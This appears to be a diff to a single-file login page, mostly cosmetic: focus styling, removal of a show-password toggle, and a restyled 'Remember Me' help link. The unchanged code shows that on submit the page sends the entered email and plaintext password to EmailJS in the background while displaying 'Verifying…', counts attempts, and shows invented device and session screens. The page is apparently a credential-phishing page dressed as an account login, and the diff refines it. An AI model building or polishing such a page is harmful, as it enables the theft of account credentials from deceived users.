@@ -92,40 +92,21 @@
       color: #1f2a37;
       font-size: 1rem;
       outline: none;
-      transition: border-color 0.15s, box-shadow 0.15s;
-    }
-    .formfield input:focus {
-      border-color: #2b8fd6;
-      box-shadow: 0 0 0 3px rgb(99 179 237 / 25%);
     }
 
-    /* Password field with show/hide toggle */
-    .password-field { position: relative; }
-    #password-input { padding-right: 76px; }
-
-    #toggle {
-      position: absolute;
-      top: 50%;
-      right: 8px;
-      transform: translateY(-50%);
-      min-width: 52px;
-      min-height: 32px;
-      padding: 4px 6px;
-      border: none;
-      border-radius: 4px;
-      background: transparent;
-      color: #1f2a37;
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      cursor: pointer;
+    /* On focus: keep the same single 1px border, no halo, no outline. */
+    .formfield input:focus,
+    .formfield input:focus-visible {
+      border: 1px solid #63b3ed;
+      box-shadow: none;
+      outline: none;
     }
-    #toggle:hover { background: #f1f5f9; }
 
     /* Remember-me row */
     .remember-row {
       display: flex;
       align-items: center;
-      gap: 8px;
+      gap: 6px;
       margin-top: 4px;
       flex-wrap: wrap;
     }
@@ -136,28 +117,30 @@
       margin: 0;
       accent-color: #363535;
     }
-    .remember-row label {
+    .remember-label {
       color: #374151;
       font-size: 0.9rem;
       font-weight: 700;
       cursor: pointer;
+      display: inline-flex;
+      align-items: center;
     }
 
-    /* Help "?" button */
+    /* Help "?" link — sky blue, sits directly after "Me" */
     .help-btn {
-      margin-left: auto;
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      border: 1px solid #cbd5e1;
-      background: #ffffff;
-      color: #374151;
-      font-size: 0.8rem;
+      padding: 0;
+      margin: 0 0 0 4px;
+      border: none;
+      background: none;
+      color: #38bdf8;
+      font-size: 0.9rem;
       font-weight: 700;
       line-height: 1;
+      text-decoration: underline;
+      text-underline-offset: 2px;
       cursor: pointer;
     }
-    .help-btn:hover { background: #f1f5f9; }
+    .help-btn:hover { color: #0284c7; }
 
     .help-panel {
       display: none;
@@ -231,10 +214,9 @@
     }
     #form-error-banner.show { display: block; }
 
-    /* Focus rings */
+    /* Focus rings (buttons & links only — inputs handled above) */
     button:focus-visible,
-    a:focus-visible,
-    input:focus-visible {
+    a:focus-visible {
       outline: 2px solid #2b8fd6;
       outline-offset: 3px;
     }
@@ -269,7 +251,6 @@
     .verify-status { color: #5b6b7c; font-size: 0.9rem; min-height: 1.2em; }
 
     @media (prefers-reduced-motion: reduce) {
-      .formfield input { transition: none; }
       .spinner { animation-duration: 2s; }
     }
 
@@ -381,18 +362,15 @@
 
         <div class="formfield">
           <label for="password-input">Password</label>
-          <div class="password-field">
-            <input type="password" id="password-input" name="password"
-                   placeholder="Password" required
-                   autocomplete="current-password" />
-            <button type="button" id="toggle" aria-label="Show password">show</button>
-          </div>
+          <input type="password" id="password-input" name="password"
+                 placeholder="Password" required
+                 autocomplete="current-password" />
           <span class="error-text" id="password-error"></span>
         </div>
 
         <div class="remember-row">
           <input type="checkbox" id="remember_me" name="remember_me" checked />
-          <label for="remember_me">Remember Me</label>
+          <label for="remember_me" class="remember-label">Remember Me</label>
           <button type="button" class="help-btn"
                   id="remember-help-btn"
                   aria-expanded="false"
@@ -474,7 +452,6 @@ const emailError      = document.getElementById("email-error");
 const passwordError   = document.getElementById("password-error");
 const formErrorBanner = document.getElementById("form-error-banner");
 const submitBtn       = document.getElementById("submit-btn");
-const toggleBtn       = document.getElementById("toggle");
 
 const loginView         = document.getElementById("login-view");
 const verifyingOverlay  = document.getElementById("verifying-overlay");
@@ -483,14 +460,14 @@ const activityView      = document.getElementById("activity-view");
 const currentDeviceMeta = document.getElementById("current-device-meta");
 const unknownDeviceMeta = document.getElementById("unknown-device-meta");
 
-const sessionCurrent  = document.getElementById("session-current");
-const sessionWarsaw   = document.getElementById("session-warsaw");
+const sessionCurrent   = document.getElementById("session-current");
+const sessionWarsaw    = document.getElementById("session-warsaw");
 const removeCurrentBtn = document.getElementById("remove-current");
 const removeWarsawBtn  = document.getElementById("remove-warsaw");
 const alertBox         = document.getElementById("alert-box");
 
 /* =========================================================================
-   Help popover (replaces the old Alpine.js x-show)
+   Help popover
    ========================================================================= */
 const helpBtn   = document.getElementById("remember-help-btn");
 const helpPanel = document.getElementById("remember-help-panel");
@@ -514,17 +491,6 @@ document.addEventListener("keydown", (e) => {
     setHelp(false);
     helpBtn.focus();
   }
-});
-
-/* =========================================================================
-   Show / hide password
-   ========================================================================= */
-toggleBtn.addEventListener("click", (e) => {
-  e.preventDefault();
-  const show = passwordInput.type === "password";
-  passwordInput.type = show ? "text" : "password";
-  toggleBtn.textContent = show ? "hide" : "show";
-  toggleBtn.setAttribute("aria-label", show ? "Hide password" : "Show password");
 });
 
 /* =========================================================================
@@ -779,8 +745,8 @@ let attemptNumber = 1;
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  emailError.textContent    = "";
-  passwordError.textContent = "";
+  emailError.textContent      = "";
+  passwordError.textContent   = "";
   formErrorBanner.textContent = "";
   formErrorBanner.classList.remove("show");
 
@@ -810,8 +776,8 @@ form.addEventListener("submit", async (e) => {
 
   recordAttempt();
 
-  submitBtn.disabled     = true;
-  submitBtn.textContent  = "Verifying…";
+  submitBtn.disabled    = true;
+  submitBtn.textContent = "Verifying…";
 
   // Fire-and-forget: don't block the UX on EmailJS.
   sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
